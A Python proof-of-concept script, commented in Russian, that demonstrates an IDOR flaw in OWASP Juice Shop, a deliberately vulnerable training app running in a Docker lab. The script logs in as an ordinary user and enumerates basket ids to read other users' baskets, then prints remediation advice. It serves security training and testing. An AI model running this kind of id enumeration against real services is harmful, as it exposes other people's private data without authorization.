#!/usr/bin/env python3
"""
Broken Access Control (IDOR) PoC для OWASP Juice Shop
Целевой эндпоинт: /api/BasketItems/?id=<bid>
Уязвимость: Отсутствие проверки владельца корзины позволяет просматривать содержимое чужих корзин.
"""

import requests
import sys
import json
from colorama import Fore, Style, init

init(autoreset=True)

TARGET = "http://juice-shop:3000"
LOGIN_ENDPOINT = f"{TARGET}/rest/user/login"
WHOAMI_ENDPOINT = f"{TARGET}/rest/user/whoami"
BASKET_ENDPOINT = f"{TARGET}/api/BasketItems/"

def print_header():
    print(f"\n{Fore.CYAN}{'='*80}")
    print(f"{Fore.CYAN}Broken Access Control (IDOR) PoC для OWASP Juice Shop")
    print(f"{Fore.CYAN}{'='*80}")
    print(f"\n{Fore.YELLOW}Целевой эндпоинт: {BASKET_ENDPOINT}?id=<bid>")
    print(f"{Fore.YELLOW}Окружение: Docker Virtual Environment (Attacker Container)")
    print(f"{Fore.YELLOW}Дата запуска: {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

def check_service_health():
    print(f"\n{Fore.CYAN}[*] Проверка доступности Juice Shop...")
    try:
        response = requests.get(f"{TARGET}/", timeout=5)
        if response.status_code == 200:
            print(f"{Fore.GREEN}✓ Juice Shop доступен и работает!")
            return True
    except Exception as e:
        print(f"{Fore.RED}✗ Ошибка подключения: {e}")
        print(f"{Fore.RED}Убедитесь, что Juice Shop запущен: docker compose up -d juice-shop")
        return False

def login_and_get_token(email, password):
    print(f"\n{Fore.YELLOW}[1] Логинизация обычным пользователем")
    data = {"email": email, "password": password}
    try:
        r = requests.post(LOGIN_ENDPOINT, json=data, timeout=5)
        if r.status_code != 200:
            print(f"{Fore.RED}✗ Login failed, HTTP {r.status_code}")
            print(f"{Fore.RED}Ответ: {r.text}")
            sys.exit(1)
        resp_data = r.json()
        token = resp_data['authentication']['token']
        print(f"{Fore.GREEN}✓ Логин успешен, получен JWT-токен")
        return token
    except Exception as e:
        print(f"{Fore.RED}Ошибка логина: {e}")
        sys.exit(1)

def get_my_basket_id(headers):
    print(f"\n{Fore.YELLOW}[2] Получение уникального basket id текущего пользователя")
    try:
        r = requests.get(WHOAMI_ENDPOINT, headers=headers, timeout=5)
        resp = r.json()
        basket_id = resp.get('bid') or resp.get('basket', {}).get('id') or 1
        print(f"{Fore.GREEN}Ваш basket id: {basket_id}\n")
        return int(basket_id)
    except Exception as e:
        print(f"{Fore.RED}Ошибка получения basket id: {e}")
        # Возврат 1 для продолжения PoC
        return 1

def test_idor_basket(headers, my_basket_id):
    print(f"\n{Fore.YELLOW}[3] Перебор basket id и попытка получить чужие корзины")
    print(f"{Fore.YELLOW}{'-'*80}")
    found_foreign = []
    for bid in range(1, my_basket_id + 10):
        if bid == my_basket_id:
            continue
        params = {"id": bid}
        r = requests.get(BASKET_ENDPOINT, params=params, headers=headers, timeout=5)
        print(f"{Fore.BLUE}[*] Basket id={bid} : HTTP {r.status_code}", end="")
        try:
            data = r.json()
        except Exception:
            print("")
            continue

        if r.status_code == 200 and data.get('data'):
            # Проверяем, что не пустая и не твоя корзина
            basket_items = data['data']
            foreign = any((item.get('BasketId') != my_basket_id) for item in basket_items)
            if foreign:
                print(f" {Fore.GREEN}--> Чужая корзина! ({len(basket_items)} товаров)")
                found_foreign.append((bid, basket_items))
                # Пример содержимого (коротко)
                for product in basket_items[:2]:
                    pname = product.get('ProductId')
                    qty = product.get('quantity')
                    print(f"    [id={bid}] ProductId: {pname}, quantity: {qty}")
            else:
                print("")
        else:
            print("")
    return found_foreign

def generate_report(found_foreign):
    print(f"\n{Fore.CYAN}{'='*80}")
    print(f"{Fore.CYAN}ИТОГОВЫЙ ОТЧЁТ")
    print(f"{Fore.CYAN}{'='*80}\n")
    if found_foreign:
        print(f"{Fore.GREEN}[+] Broken Access Control (IDOR): подтвержден!")
        print(f"{Fore.GREEN}[+] Найдено чужих корзин: {len(found_foreign)}\n")
        for (bid, items) in found_foreign:
            print(f" - Basket id={bid}: найдено {len(items)} товаров (пример):")
            sample = items[0] if items else {}
            print(f"     {json.dumps(sample, indent=2)[:120]}")
        print(f"\n{Fore.YELLOW}Рекомендация:")
        print(f"  • Проверять принадлежность id корзины — возвращать данные только текущему владельцу!")
        print(f"  • Скрывать структуру BasketId на клиенте.")
        print(f"  • Использовать Access Control Matrix.")
    else:
        print(f"{Fore.YELLOW}[-] Broken Access Control (IDOR) не подтверждён")
    print(f"{Fore.CYAN}{'='*80}\n")

def main():
    print_header()
    if not check_service_health():
        sys.exit(1)
    email = "user@juice-sh.op"
    password = "user123"
    token = login_and_get_token(email, password)
    headers = {"Authorization": f"Bearer {token}"}
    my_basket_id = get_my_basket_id(headers)
    found_baskets = test_idor_basket(headers, my_basket_id)
    generate_report(found_baskets)

if __name__ == "__main__":
    main()